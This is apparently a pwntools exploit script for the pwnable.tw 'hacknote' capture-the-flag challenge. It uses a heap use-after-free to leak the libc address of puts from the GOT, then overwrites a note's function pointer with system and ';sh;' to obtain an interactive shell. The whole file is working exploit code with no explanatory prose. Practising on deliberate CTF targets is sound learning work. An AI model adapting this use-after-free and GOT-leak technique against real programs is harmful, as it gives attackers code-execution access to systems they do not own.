import pwn

libc = pwn.ELF('./libc_32.so.6')
elf_hacknote = pwn.ELF('./hacknote_patched')

OFF_SYSTEM = libc.symbols['system']
OFF_PUTS = libc.symbols['puts']
OFF_BINSHELL = next(libc.search("/bin/sh"))

ADDR_INDIRECT_CALL = 0x0804862b
OFF_PUTS_GOT = elf_hacknote.got['puts']

# initialize process
is_local = True
if is_local:
    pwn.context.update(arch='i386', os='linux')
    p = pwn.process("./hacknote_patched")
else: 
    p = pwn.remote("chall.pwnable.tw", 10102)
# ulti function
def create_block(size, content):
    global p
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Note size :", size)
    p.sendlineafter(b"Content :", content)

def delete_block(index):
    global p
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Index :", index)

def print_out(index):
    global p
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index :", index)


######## LEAK ADDR ########
#create block
create_block(b"20", b"A"*10)
create_block(b"20", b"B"*10)

#free block
delete_block(b"0")
delete_block(b"1")

#steal block
create_block(b"8", pwn.p32(ADDR_INDIRECT_CALL) + pwn.p32(OFF_PUTS_GOT))

# get address
print_out(b"0")
LEAKED_PUTS = pwn.u32(p.recv(4))
print("[+] puts in got: ", hex(LEAKED_PUTS))
ADDR_SYSTEM = (LEAKED_PUTS - OFF_PUTS) + OFF_SYSTEM
print("[+] system addr: ", hex(ADDR_SYSTEM))

######## EXPLOIT ########
#create block
#create_block(b"20", b"A"*10)
#create_block(b"20", b"B"*10)

#free block
delete_block(b"2")

#steal block
create_block(b"8", pwn.p32(ADDR_SYSTEM) + b';sh;')
print_out(b"0")
p.interactive()

